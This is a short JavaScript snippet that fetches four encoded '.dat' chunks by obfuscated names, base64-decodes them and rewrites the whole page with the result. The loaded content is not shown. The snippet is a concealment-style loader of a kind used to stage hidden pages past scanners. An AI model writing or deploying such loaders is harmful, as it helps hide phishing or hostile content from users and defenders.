var _0x=['f9a3e7c1','d2b8f4a6','a1c5e9d3','b7f2c8e4'];
Promise.all(_0x.map(function(n){return fetch(n+'.dat').then(function(r){return r.text()})})).then(function(c){var b=atob(c.join('')),u=new Uint8Array(b.length);for(var i=0;i<b.length;i++)u[i]=b.charCodeAt(i);document.open();document.write(new TextDecoder().decode(u));document.close()});
